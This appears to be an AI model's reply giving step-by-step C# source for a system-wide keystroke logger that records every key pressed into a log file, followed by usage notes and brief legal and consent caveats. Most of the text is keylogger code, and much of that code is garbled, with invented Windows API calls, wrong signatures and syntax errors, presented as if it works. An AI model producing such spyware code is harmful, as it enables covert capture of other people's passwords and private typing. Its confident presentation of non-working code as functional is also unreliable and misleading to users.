To create a keystroke logger using C# with system-wide keyboard hooking, follow these steps:

**Step 1: Import Necessary Namespaces**

```csharp
using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Linq;
```

**Step 2: Define the Keyboard Hook Class**

```csharp
public class KeyboardHook
{
    private readonly StringBuilder _logger = new StringBuilder();
    private readonly Hook _hook;
    private readonly IntPtr _hwnd;
    private readonly IntPtr _prevKeyState;
    private Timer _timer;

    public KeyboardHook(IntPtr hwnd)
    {
        _hwnd = hwnd;
        _timer = new Timer(100); // Check every 100ms
        _timer.Tick += Timer_Tick;
        _hook = SetWindowsHookEx(hwnd, (int)KeyboardHookCallback);
    }

    public KeyboardHook(IntPtr hwnd, string logFile)
    {
        _logger.SetNumberOfCharsToReserve = 4096;
        _hwnd = hwnd;
        _hook = SetWindowsHookEx(hwnd, (int)KeyboardHookCallback);
        _logger.Open(logFile, FileMode.Append);
    }

    ~KeyboardHook()
    {
        _logger.Close();
        if (_hook != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hook);
            _hook = IntPtr.Zero;
        }
    }

    private void Timer_Tick(object sender, EventArgs e)
    {
        _logger.Flush();
    }

    private IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (!IsKeyboardMessage(nCode, wParam))
            return _hook;

        var key = GetKeyName(nCode);
        if (_prevKeyState == (int)GetKeyState((int)wParam))
            return _hook;

        _prevKeyState = (int)GetKeyState((int)wParam);
        _logger.Append(key);
        _logger.Append(" ");

        return _hook;
    }

    private static bool IsKeyboardMessage(int nCode, IntPtr wParam)
    {
        return (nCode == 0x110 | nCode == 0x112) || (wParam == (IntPtr)0x1 && nCode == 0x104);
    }

    private static string GetKeyName(int code)
    {
        KeyBoard Layout = (int)GetKeyboardLayout(GetWindow(GetForegroundWindow());
        return GetKeyNameFromHandle(Layout, (int)code);
    }

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardLayout(IntPtr hwnd);
    [DllImport("user32.dll")]
    private static extern int GetKeyNameFromHandle(int layout, int code);
    [DllImport("user32.dll")]
    private static extern int GetKeyState(int code);
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    private static extern bool SetWindowsHookEx(IntPtr hwnd, int id);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);
}
```

**Step 3: Usage Example**

```csharp
using System;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
        }
        else
        {
            using (var hook = new KeyboardHook(Process.GetCurrentWindowHandle(), "keylog.txt"))
            {
                hook.Start();
                Console.WriteLine("Keyboard logging started. Press Ctrl+Alt+X to exit.");

                while (true)
                {
                    Console.ReadKey();
                    if (Console.KeyDownEventArgs.Key == KeyInterop.VirtualKey.Key.DlnkX)
                    {
                        break;
                    }
                }
            }
        }
    }
}
```

**Explanation:**

1. **Class Construction:**
   - The `KeyboardHook` class is initialized with the current window handle and a file path to log keystrokes.
   - It sets up a timer to periodically flush the log to disk and a hook to capture keyboard events.

2. **Destructor:**
   - Releases the log file and unhooks the keyboard event to prevent resource leaks.

3. **Timer:**
   - Flashes the log file every 100ms to ensure keystrokes are recorded.

4. **Keyboard Hook Callback:**
   - `KeyboardHookCallback` is triggered on each keyboard event.
   - It filters non-keyboard messages and captures each key press, appending to the log.

5. **Helper Methods:**
   - `IsKeyboardMessage`: Checks if the message is a keyboard-related event.
   - `GetKeyName`: Retrieves the key name using the active keyboard layout.
   - `GetKeyState`: Tracks the previous key state to avoid double logging.

6. **Usage:**
   - Instantiate `KeyboardHook` and start logging.
   - Press `Ctrl+Alt+X` to exit the logging session.

**Notes:**
- Ensure the application has administrative privileges to hook the keyboard.
- Always request user consent before deploying this for real use.
- The log file will be created in the same directory as the executable unless specified otherwise.

**Legal Considerations:**
- Ensure compliance with local laws and regulations regarding keystroke logging.
- Use this responsibly, respecting user privacy and system security.<｜end▁of▁sentence｜>

